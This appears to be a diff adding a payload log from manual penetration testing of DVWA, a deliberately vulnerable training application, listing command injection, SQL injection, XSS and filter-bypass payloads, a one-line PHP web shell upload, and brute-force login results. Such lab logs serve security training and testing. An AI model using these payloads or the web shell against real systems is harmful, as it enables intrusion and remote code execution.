@@ -1,0 +1,20 @@
+====================================================================================================
+DVWA MANUAL PENETRATION TESTING - PAYLOAD LOG (Target: 192.168.56.106)
+Columns: Payload | Vulnerability | DVWA Level | Result
+====================================================================================================
+
+Payload | Vulnerability | DVWA Level | Result
+----------------------------------------------------------------------------------------------------
+127.0.0.1; id | OS Command Injection | Low | Success - Executed OS command; returned uid=33(www-data)
+127.0.0.1 | id | OS Command Injection | Medium | Success - Bypassed ';' and '&&' filter using pipe '|' operator
+' OR 1=1 -- - | SQL Injection (SQLi) | Low | Success - Dumped all user first names and surnames from database
+id=1 OR 1=1&Submit=Submit | SQL Injection (SQLi) | Medium | Success - Bypassed dropdown UI & quote escaping via POST body tamper
+<script>alert('Reflected-XSS')</script> | Reflected XSS | Low | Success - Triggered JavaScript alert box in browser
+<SCRIPT>alert('XSS-Med')</SCRIPT> | Reflected XSS | Medium | Success - Bypassed case-sensitive <script> filter
+<script>alert('Stored-XSS')</script> | Stored XSS | Low | Success - Persistent JavaScript executed on guestbook load
+<scr<script>ipt>alert('Stored-Med')</scr<script>ipt> | Stored XSS | Medium | Success - Bypassed maxlength=10 & single-pass <script> filter
+shell.php (<?php system($_GET["cmd"]); ?>) | Unrestricted File Upload | Low | Success - Uploaded directly and achieved RCE via ?cmd=id
+shell.php (Content-Type: image/jpeg) | Unrestricted File Upload | Medium | Success - Bypassed MIME validation and achieved RCE
+admin / wrong123 -> admin / password | Broken Authentication (Brute Force) | Low | Success - No account lockout or rate limiting enforced
+admin / wrong1234 -> admin / password | Broken Authentication (Brute Force) | Medium | Success - 2-second sleep delay observed, no account lockout
+====================================================================================================
